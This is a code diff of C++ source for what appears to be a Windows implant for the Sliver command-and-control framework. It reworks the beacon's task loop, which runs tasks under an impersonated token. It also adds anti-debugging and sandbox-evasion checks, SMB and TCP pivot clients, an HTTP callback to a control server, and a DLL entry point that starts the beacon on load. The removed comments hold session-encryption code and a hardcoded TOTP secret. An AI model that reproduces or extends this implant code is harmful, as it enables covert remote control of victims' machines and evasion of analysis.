@@ -160,26 +160,45 @@ void BeaconMain(shared_ptr<Beacon> beacon, std::chrono::time_point<std::chrono::
         for (auto it = tasks.begin();it != tasks.end();++it) {
             if (sysHandlers.contains(it->type())) {
                 auto it_2 = sysHandlers.find(it->type());
-                auto fut = std::async(
+                auto htoken = token::getToken();
+                if (htoken != INVALID_HANDLE_VALUE) {
+                    ImpersonateLoggedOnUser(token::getToken());
+                }
+                auto res = it_2->second(it->id(), it->data());
+                if (htoken != INVALID_HANDLE_VALUE) {
+                    RevertToSelf();
+                }
+                /*auto fut = std::async(
                     [](handlers::handler h, int64_t id, const std::string& data) {
                         auto htoken = token::getToken();
                         if (htoken != INVALID_HANDLE_VALUE) {
                             ImpersonateLoggedOnUser(token::getToken());
                         }
-                        auto res = h(id, data);
+                        sliverpb::Envelope res;
+                        res = h(id, data);
                         if (htoken != INVALID_HANDLE_VALUE) {
                             RevertToSelf();
                         }
                         return res;
                     }, it_2->second, it->id(), it->data());
-                tasks_results.mutable_tasks()->Add(fut.get());
+                sliverpb::Envelope task_res;
+                try {
+                    task_res = fut.get();
+                }
+                catch (exception e) {
+                    cout << e.what() << endl;
+                }*/
+                auto env = tasks_results.mutable_tasks()->Add();
+                env->set_data(res.data());
+                env->set_id(res.id());
+                env->set_type(res.type());
             }
-            if (pivotHandlers.contains(it->type())) {
+            else if (pivotHandlers.contains(it->type())) {
                 auto it_2 = pivotHandlers.find(it->type());
                 auto env = it_2->second(*(it), beacon);
                 tasks_results.mutable_tasks()->Add(std::move(env));
             }
-            if (it->type() == sliverpb::MsgReconfigureReq) {
+            else if (it->type() == sliverpb::MsgReconfigureReq) {
                 sliverpb::ReconfigureReq req;
                 req.ParseFromString(it->data());
                 if (beacon->Reconfigure(req.beaconinterval(), req.beaconjitter(), req.reconnectinterval())) {
@@ -476,12 +495,12 @@ void BeaconMainLoop(shared_ptr<Beacon> beacon) {
 //        }*/
 //    }
 //}
-int main()
-{
-
+int Entry() {
+#ifndef DEBUG
     PPEB pPEB = (PPEB)__readgsqword(0x60);
     if (pPEB->BeingDebugged) return 0;
-
+#endif
+#ifdef DELAY
     ULONGLONG uptimeBeforeSleep = GetTickCount64();
     typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
     PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
@@ -490,12 +509,12 @@ int main()
     pNtDelayExecution(FALSE, &delay);
     ULONGLONG uptimeAfterSleep = GetTickCount64();
     if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;
-
+#endif
 #ifdef  PIVOT
-#ifdef SMB
+#ifdef SMBPIVOT
     unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "\\\\192.168.161.30\\pipe\\pivotbar" });
 #endif
-#ifdef TCP
+#ifdef TCPPIVOT
     unique_ptr<IClient> cli = make_unique<TCPClient>(string{ "192.168.161.30:9005" });
 #endif
 #endif
@@ -503,137 +522,53 @@ int main()
     unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "http://192.168.161.50" }, 10, 10, 10);
 #endif
     //  PIVOT
-   
-   instanceID = uuids::to_string(uuids::uuid_system_generator{}());
-   shared_ptr<Beacon> beacon = make_shared<Beacon>("http://192.168.161.50",cli);
-   while (1) {
-       BeaconMainLoop(beacon);
 
-       Sleep(std::chrono::duration_cast<std::chrono::milliseconds>(
-           beacon->GetReconnectInterval()).count());
-   }
-   /*instanceID = uuids::to_string(uuids::uuid_system_generator{}());
-   shared_ptr<Connection> connection = make_shared<Connection>("http://192.168.161.50", cli);
-   while (1) {
-       SessionMainLoop(connection);
-   }*/
-   // to_call();
-   //
-   // _CrtDumpMemoryLeaks();
-   // sliverpb::Response res;
-   //   
-   // std::cout << "Hello World!\n";
-   // 
-   // sliverpb::Register req_2;
-   // sliverpb::HTTPSessionInit sess_init;
+    instanceID = uuids::to_string(uuids::uuid_system_generator{}());
+    shared_ptr<Beacon> beacon = make_shared<Beacon>("http://192.168.161.50", cli);
+    while (1) {
+        BeaconMainLoop(beacon);
 
-   // sliverpb::Envelope* env = new sliverpb::Envelope();
-
-   // sliverpb::BeaconRegister b_reg;
-
-
-   // PBYTE key = generateKey();
-   // PBYTE server_pbk = GetServerECCPublicKey();
-   // PECCKeyPair keyPair = getKeyPair();
-   // printf("key: \n");
-   // for (int i = 0;i < crypto_hash_sha256_BYTES;i++) {
-   //     printf("key[%d] = %d\n", i, key[i]);
-   // }
-   //// auto k = new basic_string((char *)key, crypto_hash_sha256_BYTES);
-   // sess_init.set_key(key, crypto_hash_sha256_BYTES);
-   // 
-   // PBYTE serialized = new BYTE[sess_init.ByteSizeLong()];
-   // sess_init.SerializeToArray(serialized, sess_init.ByteSizeLong());
-   // PBYTE encrypted = new BYTE[crypto_box_MACBYTES  + sess_init.ByteSizeLong()];
-
-   // PBYTE nonce = new BYTE[crypto_box_NONCEBYTES];
-   // randombytes_buf(nonce, crypto_box_NONCEBYTES);
-   // crypto_box_easy(encrypted, serialized, sess_init.ByteSizeLong(), nonce, server_pbk, keyPair->pv_key);
-   // //crypto_box_seal(encrypted, serialized, sess_init.ByteSizeLong(), server_pbk);
-   // unsigned char digest[crypto_hash_sha256_BYTES];
-   // crypto_hash_sha256(digest, keyPair->pb_key, crypto_box_PUBLICKEYBYTES);
-   // PBYTE encSessionInit = new BYTE[crypto_hash_sha256_BYTES + crypto_box_NONCEBYTES + crypto_box_MACBYTES + sess_init.ByteSizeLong()];
-   // memcpy(&encSessionInit[0], digest, crypto_hash_sha256_BYTES);
-   // memcpy(&encSessionInit[crypto_hash_sha256_BYTES], nonce, crypto_box_NONCEBYTES);
-   // memcpy(&encSessionInit[crypto_hash_sha256_BYTES+ crypto_box_NONCEBYTES], encrypted, crypto_box_MACBYTES + sess_init.ByteSizeLong());
-   // /*
-   // printf("encSessionInit:\n");
-   // for (int i = 0;i < crypto_hash_sha256_BYTES + crypto_box_NONCEBYTES + crypto_box_MACBYTES + sess_init.ByteSizeLong();i++) {
-   //     printf("%d\n", encSessionInit[i]);
-   // }*/
-   // //char *body = new char[sodium_base64_ENCODED_LEN(32 + crypto_box_MACBYTES + sess_init.ByteSizeLong(), sodium_base64_VARIANT_ORIGINAL_NO_PADDING)];
-   //
-   // auto enc = base64::to_base64(std::string((char *)&encSessionInit[0], crypto_hash_sha256_BYTES + crypto_box_NONCEBYTES + crypto_box_MACBYTES + sess_init.ByteSizeLong()));
-   // 
-   // char ch = '=';
-
-   // enc.erase(remove(enc.begin(), enc.end(), ch), enc.end());
-
-
-   // /*sodium_bin2base64(body, sodium_base64_ENCODED_LEN(32 + crypto_box_MACBYTES + sess_init.ByteSizeLong(), sodium_base64_VARIANT_ORIGINAL_NO_PADDING)
-   //     , encSessionInit,
-   //     32 + crypto_box_MACBYTES + sess_init.ByteSizeLong(),
-   //     sodium_base64_VARIANT_ORIGINAL_NO_PADDING);*/
-
-   // string totpsecret = "TZLMFPN6HDMZGIVSDSP7UNQNG3BNCO3Y";
-
-   // auto vec = Botan::base32_decode(totpsecret);
-   // 
-   // auto totp_key = vec.data();
-   // 
-   // auto a = Botan::TOTP(totp_key,vec.size(),"SHA-256", 8, 30);
-   // auto t = std::time(nullptr);
-   // char* end;
-   // auto timestamp=strtoull(asctime(localtime(&t)),&end,10);
-
-   // auto tp = std::chrono::system_clock::now();
-   // 
-   // auto totp = a.generate_totp(tp);
-   // 
-   // auto uri = string("http://192.168.161.50/authenticate/rpc.html");
-   // std::stringstream ss;
-
-   // int nonce_2 = rand() * encodermodulus + Base64EncoderID;
-
-   // uri = uri + string("?n=") + to_string(nonce_2) + string("&op=") + to_string(totp);
-
-    //req.setOpt<curlpp::options::Url>(uri); 
-    //req.setOpt(curlpp::options::PostFields(enc.c_str()));
-    ////req.setOpt(cURLpp::Options::WriteStream(&ss));    
-    //req.perform();
-    //httplib::Client cli("192.168.161.50", 80);
-    //cli.set_connection_timeout(0, 300000); // 300 milliseconds
-    //cli.set_read_timeout(50, 0); // 5 seconds
-    //cli.set_write_timeout(50, 0); // 5 seconds
-    //auto path = string("/authenticate/rpc.html") + string("?n=") + to_string(nonce_2) + string("&op=") + to_string(totp);
-    //auto resp = cli.Post(path, enc, "application/x-www-form-urlencoded");
-
-    //auto respval = resp.value();
-
-    //auto now = std::chrono::system_clock::now();
-    //auto serverDateHeader = respval.get_header_value("Date");
-    //if (respval.status != 200) {
-    //    auto now = std::chrono::system_clock::now();
-    //    auto serverDateHeader = respval.get_header_value("Date");
-    //    //std::chrono::system_clock()
-    //}
-    //auto decoded = base64::from_base64(respval.body);
-    //
-    //PBYTE decoded_bytes = (PBYTE)decoded.c_str();
-    //const int decoded_len = decoded.size();
-    //
-    //PBYTE nonce_3 = decoded_bytes;
-    //PBYTE encrypted_2 = &decoded_bytes[crypto_aead_chacha20poly1305_IETF_NPUBBYTES];
-    //PBYTE decrypted = new BYTE[decoded_len - crypto_aead_chacha20poly1305_IETF_NPUBBYTES - crypto_aead_chacha20poly1305_IETF_ABYTES];
-    //unsigned long long decrypted_len = 0;
-    //if (!crypto_aead_chacha20poly1305_ietf_decrypt(decrypted, &decrypted_len, NULL, encrypted_2, decoded_len - crypto_aead_chacha20poly1305_IETF_NPUBBYTES, NULL, 0, nonce_3, key)) {
-    //    printf("success");
-    //}
-    //std::string decompressed_data = gzip::decompress((const char *)decrypted, decoded_len - crypto_aead_chacha20poly1305_IETF_NPUBBYTES - crypto_aead_chacha20poly1305_IETF_ABYTES);
-    //
+        Sleep(std::chrono::duration_cast<std::chrono::milliseconds>(
+            beacon->GetReconnectInterval()).count());
+    }
 }
 
+#ifdef EXE
+int main()
+{
+    Entry();
+}
+#endif
 
+#ifdef SHARED
+extern "C" {
+
+    HINSTANCE hInst = nullptr;
+    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+    {
+        Entry();
+        if (hInst == nullptr) { hInst = hinstDLL; }
+        switch (fdwReason)
+        {
+        case DLL_PROCESS_ATTACH:
+        {
+            break;
+        }
+        case DLL_PROCESS_DETACH:
+            break;
+
+        case DLL_THREAD_ATTACH:
+            break;
+
+        case DLL_THREAD_DETACH:
+            break;
+        }
+
+        return TRUE;
+    }
+}
+
+#endif
 // Run program: Ctrl + F5 or Debug > Start Without Debugging menu
 // Debug program: F5 or Debug > Start Debugging menu
 
